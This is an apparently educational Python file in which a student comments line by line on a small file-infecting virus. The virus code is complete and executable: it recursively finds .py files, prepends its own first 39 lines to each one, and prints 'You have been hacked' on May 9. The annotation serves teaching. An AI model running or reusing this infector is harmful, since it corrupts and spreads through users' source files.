#!/usr/bin/python3

# Script: Ops 301 Challenge 14
# Author: Cameron Berry?
# Date of last revision: 6/5/23
# Purpose: Perform an analysis of the Python-based code.
#           - Insert comments into each line of the script explaining in your own words what the virus is doing on this line.
#           - Insert comments above each function explaining what the purpose of this function is and what it hopes to carry out.
#           - Insert comments above the final three lines explaining how the functions are called and what this script appears to do.

# import os and datetime module for interacting with the os and work with date/time respectively
import os
import datetime

# create variable with string "virus"
SIGNATURE = "VIRUS"

# function 'locate' marks files to infect recursively; takes the path argument defined in the function call and scans all subdirectories of current directory
def locate(path):
    # create an empty list to add marked files to (will be called back in function #2)
    files_targeted = []
    # .listdir lists all files and directories in the 'path' parameter and outputs to 'filelist' variable
    filelist = os.listdir(path)
    # begins a for loop to scan each item in 'filelist'
    for fname in filelist:
        # .isdir will check: is item on the list a file or a directory
        if os.path.isdir(path+"/"+fname):   
            # if it is a directory: the locate() function is called within itself to search further (recursively) down the path tree. Any files found meeting the criteria below are appended to the 'files_targeted' list
            # note: .extend reads for an iterable (list, tuple, etc) and appends each element individually
            files_targeted.extend(locate(path+"/"+fname))
        # if it is not a directory but IS a python file ([-3] looks at the last 3 characters of a string)
        elif fname[-3:] == ".py":
            # boolean variable set to FALSE
            infected = False
            # for loop opens current file and begins to scan each line
            # this loop checks to see if a file has the word virus in it
            # I'm pretty sure this does nothing the first time it runs, because no files have the SIGNATURE variable in them yet.
            for line in open(path+"/"+fname):
                # if the string "virus" is in a line
                if SIGNATURE in line:
                    # switch 'infected' boolean to TRUE (mark file as infected)
                    infected = True
                    # break nested for loop
                    break
            # if the string "virus" is not in a line:
            if infected == False:
                # append file to 'files_targeted' list
                files_targeted.append(path+"/"+fname)
    # after iterating through all files, the 'files_targeted' list is the output of the locate() function
    # the list at this point will have all python files 
    return files_targeted

# after the 'files_targeted' list is created, it is run as a perameter in the function declaration
# this function will read the contents of this script and save it to the beginning of any python script that the locate() function appended to the 'files_targeted' list
def infect(files_targeted):
    # the __file__ variable refers to the current script
    # this opens the script in read mode and saves it to the object 'virus'
    virus = open(os.path.abspath(__file__))
    # creates an empty variable to be written to later
    virusstring = ""
    # enumerate() retrives line number (i) and line contents (line)
    # this for loop essentially copies this script into the variable 'virusstring'
    for i,line in enumerate(virus):
        # looks for lines from 0 to 39 in script
        if 0 <= i < 39:
            # += -> the line's contents are appended to the 'virusstring' object as a string
            virusstring += line
    # closes the script after reading it's contents (close should be close())
    virus.close
    # now the real bullshittery happens
    # iterate over every file in 'failes_targeted' found by the locate() function
    for fname in files_targeted:
        # opens the file
        f = open(fname)
        # reads the file and saves the contents to the 'temp' object
        temp = f.read()
        # closes the file
        f.close()
        # reopens the same file with write permissions
        f = open(fname,"w")
        # writes this script (saved to the 'virusstring' object) concatenated with the original script  to the file
        f.write(virusstring + temp)
        # closes the file, saving it's contents
        f.close()

# on May 9th, the string "You have been hacked" will print to the console
# no idea why this is here. it seems a little extra.
def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print("You have been hacked")

# the functions below will, in this order: find all python files not infected within the directory path and mark them as infected; write this malicious script to the file while maintaining it's original contents; print a message to the user on May 9th "You have been hacked"
files_targeted = locate(os.path.abspath(""))
infect(files_targeted)
detonate()